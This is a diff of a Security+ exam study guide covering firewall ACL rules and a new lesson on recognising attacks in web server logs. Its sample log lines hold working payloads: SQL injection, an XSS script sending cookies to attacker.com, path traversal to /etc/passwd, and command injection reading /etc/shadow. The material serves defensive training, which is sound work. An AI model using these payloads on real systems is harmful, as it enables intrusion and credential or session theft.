@@ -25,9 +25,9 @@ PBQs appear right at the beginning of your exam (usually the first 3 to 5 questi
 
 ## **🧱 2\. PBQ Drill: Firewall ACL Configuration**
 
-Firewall ACL rules are processed sequentially from top to bottom (First Match Principle). Once a packet matches a rule, processing stops. The last rule in a properly built firewall list is always an **Implicit Deny**.
+Firewall ACL rules are processed sequentially from top to bottom (**First Match Principle**). Once a packet matches a rule, processing stops. The last rule in a properly built firewall list is always an **Implicit Deny**.
 
-### **Typical Ruleset Scenario:**
+Typical Ruleset Scenario:
 
 * Configure firewall rules to allow internal workstations (`192.168.1.0/24`) to browse web servers securely (`443`) and allow administrative SSH access (`22`) to a Linux jump box (`10.0.0.50`), while blocking all other traffic.
 
@@ -63,3 +63,30 @@ Firewall ACL rules are processed sequentially from top to bottom (First Match Pr
 
 Tomorrow, for **Week 7, Day 30**, we will run a **PBQ Simulation Drill on Attack Log Analysis & Header Identification**\!
 
+## **📘 Week 7, Day 30: PBQ Simulation Drill — Log Analysis & Command-Line Security Tools**
+
+Welcome to Day 30\! Having explored Firewall ACL PBQs and the "First Match" rule yesterday, we now focus on another core Performance-Based Question type: **Log Analysis & Command-Line Troubleshooting** (Domains 2.0 & 4.0).
+
+In these PBQ scenarios, CompTIA often provides command output terminals, firewall logs, or raw web server entries, requiring you to diagnose the attack vector and choose the correct command or security tool for remediation.
+
+## **📄 1\. Recognizing Attacks in Web & Server Logs**
+
+When analyzing logs in a PBQ, you will typically inspect HTTP request entries or web access logs to identify malicious payload activity.
+
+### **Key Indicators to Spot in Logs:**
+
+* **SQL Injection (SQLi):** Look for single quotes (`'`), `UNION SELECT`, `OR 1=1`, or `--` comments in URL parameters.
+
+192.168.1.105 \- \- \[16/Aug/2026:10:14:22\] "GET /login.php?user=admin'%20OR%20'1'='1 HTTP/1.1" 200 4520
+
+**Cross-Site Scripting (XSS):** Look for HTML tags, `<script>` blocks, or URL-encoded equivalents (`%3Cscript%3E`).
+
+192.168.1.110 \- \- \[16/Aug/2026:10:18:05\] "GET /search.php?q=\<script\>document.location='http://attacker.com/steal.php?cookie='+document.cookie\</script\> HTTP/1.1" 200 1200
+
+**Directory (Path) Traversal:** Look for repeated relative path traversal patterns (`../` or `%2e%2e%2f`) targeting system files like `/etc/passwd` or `win.ini`.
+
+192.168.1.112 \- \- \[16/Aug/2026:10:22:40\] "GET /download.php?file=../../../../etc/passwd HTTP/1.1" 403 280
+
+**Command Injection:** Look for shell metacharacters like semicolons (`;`), pipes (`|`), or ampersands (`&&`) followed by system commands like `cat`, `whoami`, or `ipconfig`.
+
+192.168.1.120 \- \- \[16/Aug/2026:10:30:11\] "POST /ping.php IP=127.0.0.1;cat%20/etc/shadow HTTP/1.1" 200 890  
